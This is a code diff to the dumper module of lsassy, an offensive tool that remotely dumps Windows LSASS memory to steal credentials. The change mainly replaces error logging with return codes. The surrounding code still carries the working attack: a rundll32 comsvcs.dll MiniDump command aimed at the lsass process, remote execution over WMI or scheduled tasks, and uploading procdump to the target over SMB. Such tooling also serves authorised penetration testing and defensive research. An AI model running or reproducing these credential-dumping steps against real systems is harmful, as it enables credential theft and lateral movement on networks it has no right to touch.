@@ -11,6 +11,7 @@ import string
 from lsassy.impacketfile import ImpacketFile
 from lsassy.taskexe import TASK_EXEC
 from lsassy.wmi import WMI
+from lsassy.defines import *
 
 
 class Dumper:
@@ -78,8 +79,8 @@ class Dumper:
                 ["dll", "cmd", ("task",)]
             ]
         else:
-            self._log.error("Method \"{}\" is not supported (0-4). See -h for help".format(self._method))
-            return False
+            self._log.debug("Method \"{}\" is not supported (0-4). See -h for help".format(self._method))
+            return RetCode(ERROR_METHOD_NOT_SUPPORTED)
 
         ifile = ImpacketFile(self._conn, self._log)
         for dump_methodology in dump_methodologies:
@@ -90,7 +91,6 @@ class Dumper:
             elif dump_method == "procdump":
                 dumped = self.procdump_dump(exec_methods)
             else:
-                self._log.error("Incorrect dump method \"{}\". Currently supported : procdump, dll".format(dump_method))
                 continue
 
             if dumped:
@@ -105,9 +105,8 @@ class Dumper:
                     )
 
                     if ifile.size() < 100 and ifile.read(6).decode('utf-8') == "FAILED":
-                        self._log.error("lsass is protected")
                         ifile.close()
-                        return False
+                        return RetCode(ERROR_LSASS_PROTECTED)
                     ifile.seek(0)
                     return ifile
                 except Exception as e:
@@ -117,8 +116,7 @@ class Dumper:
         """
         If no dump file was found, it means that procdump didn't crash, so it may take more time than expected.
         """
-        self._log.warn("Target could be slow. Try to increase --timeout value")
-        return False
+        return RetCode(ERROR_SLOW_TARGET)
 
     def dll_dump(self, exec_methods=("wmi", "task"), exec_shell="cmd"):
         if exec_shell == "cmd":
@@ -129,8 +127,7 @@ class Dumper:
             command = 'powershell.exe -NoP -C "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {}{} full;Wait-Process -Id (Get-Process rundll32).id"'.format(
                 self._tmp_dir, self._remote_lsass_dump)
         else:
-            self._log.error("Shell {} is not supported".format(exec_shell))
-            return False
+            return RetCode(ERROR_UNDEFINED)
 
         self._log.debug("Command : {}".format(command))
 
@@ -142,11 +139,11 @@ class Dumper:
                     self._log.debug("Trying exec method : \"{}\"".format(exec_method))
                     self.exec_methods[exec_method](self._conn, self._log).execute(command)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
-                    return True
+                    return RetCode(ERROR_SUCCESS)
                 except Exception as e:
-                    self._log.error("Exec method \"{}\" failed.".format(exec_method))
+                    self._log.debug("Exec method \"{}\" failed.".format(exec_method))
                     self._log.debug('Error : {}'.format(e))
-            return False
+            return RetCode(ERROR_DLL_NO_EXECUTE)
 
     def procdump_dump(self, exec_methods=("wmi", "task")):
         """
@@ -154,12 +151,12 @@ class Dumper:
         :param exec_methods: If set, it will use specified execution method. Default to WMI, then TASK
         """
         if not self._procdump_path:
-            self._log.error("Procdump path has not been provided")
-            return False
+            self._log.warning("Procdump path has not been provided")
+            return RetCode(ERROR_PROCDUMP_NOT_PROVIDED)
         # Verify procdump exists on host
         if not os.path.exists(self._procdump_path):
-            self._log.error("{} does not exist.".format(self._procdump_path))
-            return False
+            self._log.warning("{} does not exist.".format(self._procdump_path))
+            return RetCode(ERROR_PROCDUMP_NOT_FOUND)
 
         # Upload procdump
         self._log.debug('Copy {} to {}'.format(self._procdump_path, self._tmp_dir))
@@ -167,9 +164,7 @@ class Dumper:
             try:
                 self._conn.putFile(self._share, self._tmp_dir + self._procdump, procdump.read)
             except Exception as e:
-                self._log.error("Couldn't upload procdump.")
-                self._log.debug("Error : {}".format(e))
-                return False
+                return RetCode(ERROR_PROCDUMP_NOT_UPLOADED)
         self.procdump = True
 
         # Dump lsass using PID
@@ -190,9 +185,9 @@ class Dumper:
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
                     return True
                 except Exception as e:
-                    self._log.error("Exec method \"{}\" failed.".format(exec_method))
+                    self._log.warning("Exec method \"{}\" failed.".format(exec_method))
                     self._log.debug("Error : {}".format(str(e)))
-            return False
+            return RetCode(ERROR_WMI_NO_EXECUTE)
 
     def clean(self):
         try:
